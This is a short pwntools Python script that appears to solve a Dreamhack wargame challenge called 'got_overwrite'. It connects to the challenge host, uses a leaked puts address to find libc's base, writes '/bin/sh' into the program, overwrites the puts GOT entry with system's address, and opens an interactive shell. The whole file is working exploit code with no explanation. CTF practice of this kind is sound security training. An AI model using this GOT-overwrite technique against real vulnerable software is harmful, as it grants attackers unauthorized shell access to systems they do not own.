from pwn import *

p = remote("host3.dreamhack.games",12802)

e = context.binary = ELF("./got_overwrite", checksec = False)
libc = ELF("./libc.so.6", checksec = False)

put_offset = libc.symbols["puts"]
system_offset = libc.symbols["system"]

p.recvuntil(b"puts: ")
put = int(p.recvline()[:-1], 16)

libc_base = put - put_offset
system = libc_base + system_offset

put_got = e.got["puts"]

p.sendafter(b"command: ", b"/bin/sh\x00")

p.sendafter(b"where: ", p64(put_got))

p.sendafter(b"value: ", p64(system))

p.interactive()
